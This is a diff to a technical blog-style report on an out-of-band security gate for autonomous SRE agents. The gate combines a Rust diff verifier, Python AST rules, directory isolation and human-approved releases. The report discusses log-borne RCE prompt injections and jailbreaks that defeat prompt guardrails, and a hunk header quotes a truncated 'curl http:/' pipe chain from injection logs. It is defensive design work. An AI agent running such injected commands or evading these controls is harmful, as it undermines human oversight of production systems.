@@ -1,6 +1,6 @@
-# Why Prompt Guardrails Fail: Building an Out-of-Band Rust AST Security Gate for Autonomous SRE Agents
+# Why Prompt Guardrails Fail: Building an Out-of-Band Security Gate for Autonomous SRE Agents
 
-**How we locked three Switch Console agents inside directory-isolated trust rings, stopped multiline RCE prompt injections in 9ms, survived 32-worker alert storms with POSIX file locks, and contributed upstream to Switch Core.**
+**How we locked three Switch Console agents inside directory-isolated trust rings, stopped multiline RCE prompt injections in 9ms with a compiled Rust verifier and Python AST analysis, survived 32-worker alert storms with POSIX file locks, and contributed upstream to Switch Core.**
 
 *By Anshul Jain • November 2026 • 6 min read • Stripe / Cloudflare Style Technical Report*
 
@@ -33,11 +33,11 @@ Giving an autonomous AI agent shell and Git access to debug and patch production
 
 ## 2. The 3-Ring Defense Model
 
-SwitchGuard SRE pairs three directory-isolated **Switch Console** agents (`@sre-sentinel`, `@sre-repro`, `@sre-clerk`) with an out-of-band compiled Rust binary (`switchguard-cli`) to establish strict physical and cryptographic boundaries around the autonomous repair loop:
+SwitchGuard SRE pairs three directory-isolated **Switch Console** agents (`@sre-sentinel`, `@sre-repro`, `@sre-clerk`) with an out-of-band compiled Rust verifier (`switchguard-cli`) combining diff scanning with Python AST analysis to establish strict physical and cryptographic boundaries around the autonomous repair loop:
 
 - **Outer Ring (`@sre-sentinel`) • Telemetry Ingress:** Bound strictly to `workspace/telemetry` with zero read or write access to application source code. It executes `switchguard-cli scrub` to redact secrets into salted HMAC tokens (e.g. `[REDACTED_EMAIL_a1b2c3]`) in **7.19ms** and performs $O(1)$ canonical fault fingerprinting against `dedup_index.json` in **<0.5ms** under a POSIX `fcntl.flock` file mutex. Duplicate storm alerts are logged to disk without waking downstream LLMs.
-- **Inner Ring (`@sre-repro`) • Code Sandbox:** Confined strictly to `workspace/sandbox-app`. It enforces Test-Driven Development (writing a failing `pytest` reproduction test in `test_cart.py` before patching `cart_service.py`). Before changes can be presented for approval, it invokes `switchguard-cli verify-diff .`, which inspects unified diffs and walks Python's native Abstract Syntax Tree (AST) in **9.07ms p50** to enforce 10 non-negotiable security and syntax rules.
-- **Release Ring (`@sre-clerk`) • Release Operations:** Human-gated release authority inside `workspace/release-ops`. It remains completely idle until an authorized human Incident Commander posts an explicit `Approved` token. It then evaluates 4 pre-release verification gates, packages the clean patch, and commits an immutable entry into `RELEASE_AUDIT.log` using a SHA-256 hash chain verified from genesis root.
+- **Inner Ring (`@sre-repro`) • Code Sandbox:** Confined strictly to `workspace/sandbox-app`. It enforces Test-Driven Development (writing a failing `pytest` reproduction test in `test_cart.py` before patching `cart_service.py`). Before changes can be presented for approval, it invokes `switchguard-cli verify-diff .`, which inspects unified diffs and walks Python's native Abstract Syntax Tree (AST) in **9.07ms p50** to enforce 16 non-negotiable security and syntax rules.
+- **Release Ring (`@sre-clerk`) • Release Operations:** Human-gated release authority inside `workspace/release-ops`. It remains completely idle until an authorized human Incident Commander posts an explicit `Approved` token. It then evaluates 5 pre-release verification gates (including red-to-green TDD verification), packages the clean patch, and commits an immutable entry into `RELEASE_AUDIT.log` using a SHA-256 hash chain verified from genesis root.
 
 ---
 
@@ -219,7 +219,7 @@ When evaluating prompt-injection logs containing shell pipe chains (`curl http:/
 
 | # | Design Decision | Chosen Approach | Alternative Considered | Engineering Justification |
 | :-: | :--- | :--- | :--- | :--- |
-| **1** | **Security Boundary** | Out-of-band compiled Rust binary (`switchguard-cli`) | System prompt instructions ("Please do not run shell commands") | Prompts can be bypassed by jailbreaks and adversarial log injections. Compiled machine code outside Python memory cannot be modified by the LLM. |
+| **1** | **Security Boundary** | Out-of-band compiled Rust verifier (`switchguard-cli`) + Python AST analysis | System prompt instructions ("Please do not run shell commands") | Prompts can be bypassed by jailbreaks and adversarial log injections. Compiled machine code outside Python memory cannot be modified by the LLM (assuming standard OS filesystem permissions prevent the agent workspace from writing to the binary directory, verified via `TRUSTED_BINARY_SHA256`). |
 | **2** | **Secret Redaction** | Salted HMAC Tokens (`[REDACTED_EMAIL_a1b2c3]`) | Generic static tokens (`[REDACTED]`) | Static tokens erase context. Salted HMAC tokens preserve entity correlation: engineers can see whether 50 errors came from 1 customer or 50 distinct customers without seeing raw PII. |
 | **3** | **AST Analysis** | Native Rust diff check + Python `ast.walk` | Heavy SAST frameworks (Semgrep, Bandit, SonarQube) | External SAST tools have 3-to-5 second startup times. Our targeted verifier runs in `8.11ms` p50 with zero external package dependencies. |
 | **4** | **Concurrency Control** | POSIX kernel file locks (`fcntl.flock`) + `os.fsync` | External daemon (Redis, PostgreSQL, RabbitMQ) | Eliminates background memory overhead (0 MB daemon RAM), allowing 3 agents to run on resource-constrained 8 GB hosts while handling 32 parallel alert workers without race conditions. |
